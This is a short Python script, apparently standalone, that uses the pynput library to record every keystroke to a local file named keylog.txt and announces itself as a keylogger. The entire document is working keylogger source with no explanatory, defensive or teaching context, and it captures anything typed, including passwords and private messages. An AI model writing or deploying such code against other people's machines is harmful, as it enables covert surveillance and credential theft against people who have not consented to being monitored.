from pynput.keyboard import Listener

log_file = "keylog.txt"

def on_press(key):
    with open(log_file, "a") as f:
        try:
            f.write(key.char)
        except AttributeError:
            f.write(f" [{key}] ")

with Listener(on_press=on_press) as listener:
    print("Keylogger started... Press Ctrl+C to stop.")
    listener.join()
